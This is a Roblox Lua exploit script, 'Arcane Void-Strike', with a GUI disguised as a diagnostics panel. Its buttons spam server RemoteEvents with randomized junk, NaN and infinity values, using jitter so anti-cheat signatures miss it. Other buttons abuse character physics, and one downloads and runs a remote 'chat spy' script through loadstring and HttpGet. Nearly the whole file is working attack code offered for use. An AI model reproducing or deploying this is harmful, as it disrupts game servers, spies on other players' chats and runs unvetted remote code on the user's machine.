--[[ 
    🔱 ARCANE VOID-STRIKE v1.1 [SILENT-STRIKE] 🔱
    "In silence, the signal is absolute. <3"
    
    CAMOUFLAGE UPDATES:
    - Adaptive Jittering (Variable delays)
    - Randomized Payload Injection
    - Obfuscated UI Headers
    - Targeted Remote Scanning (Less noise)
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 1. STEALTH NOTIFIER
local function ntf(m)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "SIGNAL STATUS",
            Text = m,
            Duration = 3
        })
    end)
end

-- 2. UI CAMOUFLAGE
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "InternalSignal_v1"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 320, 0, 280)
Main.Position = UDim2.new(0.5, -160, 0.5, -140)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
Main.BorderSizePixel = 0
Main.Active = true
Main.Draggable = true

-- Fake Header
local Header = Instance.new("Frame", Main)
Header.Size = UDim2.new(1, 0, 0, 30)
Header.BackgroundColor3 = Color3.fromRGB(25, 25, 25)

local Title = Instance.new("TextLabel", Header)
Title.Size = UDim2.new(1, -10, 1, 0)
Title.Position = UDim2.new(0, 10, 0, 0)
Title.Text = "SYSTEM_DIAGNOSTICS_v1.1" -- Discret
Title.TextColor3 = Color3.fromRGB(200, 200, 200)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Font = Enum.Font.Code
Title.TextSize = 12
Title.BackgroundTransparency = 1

local function createSilentBtn(name, y, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 40)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
    btn.Text = name
    btn.TextColor3 = Color3.new(1,1,1)
    btn.Font = Enum.Font.Gotham
    btn.MouseButton1Click:Connect(callback)
end

-- 3. THE SILENT ENGINE
local active = { loop = false }

-- NOISE REDUCTION: On choisit des remotes spécifiques au lieu de tout saturer d'un coup
local function getTargets()
    local t = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and not v.Name:lower():find("voice") then
            table.insert(t, v)
        end
    end
    return t
end

createSilentBtn("🔥 EXECUTE [DEEP_OVERRIDE]", 50, function()
    active.loop = not active.loop
    ntf(active.loop and "OVERRIDE START" or "OVERRIDE STOP")
    
    if active.loop then
        task.spawn(function()
            local targets = getTargets()
            while active.loop do
                for i = 1, 20 do -- Burst court
                    if not active.loop then break end
                    local r = targets[math.random(1, #targets)]
                    if r then
                        -- Payload aléatoire pour éviter la détection de signature
                        local data = Http:GenerateGUID(false) .. string.rep("0", math.random(100, 500))
                        pcall(function() r:FireServer(data, 0/0, math.huge) end)
                    end
                end
                -- JITTER: On attend un temps aléatoire pour casser le pattern de bot
                task.wait(0.05 + math.random() * 0.1) 
            end
        end)
    end
end)

createSilentBtn("⚡ PHYSICS DESYNC", 100, function()
    ntf("PHYS_MOD_ACTIVE")
    local hrp = L.Character and L.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        for i = 1, 500 do
            hrp.Velocity = Vector3.new(math.random(-1e8, 1e8), 500, math.random(-1e8, 1e8))
            RS.Heartbeat:Wait()
        end
    end
end)

createSilentBtn("👁️ ACTIVATE_SNIFFER", 150, function()
    ntf("SNIFFER_READY")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Arcane-Project/Public/main/CHAT_SPY_SUPREME.lua"))()
end)

createSilentBtn("🛑 EMERGENCY_STOP", 200, function()
    active.loop = false
    ntf("CLEANUP_DONE")
end)

ntf("INTERNAL_SIGNAL READY.")
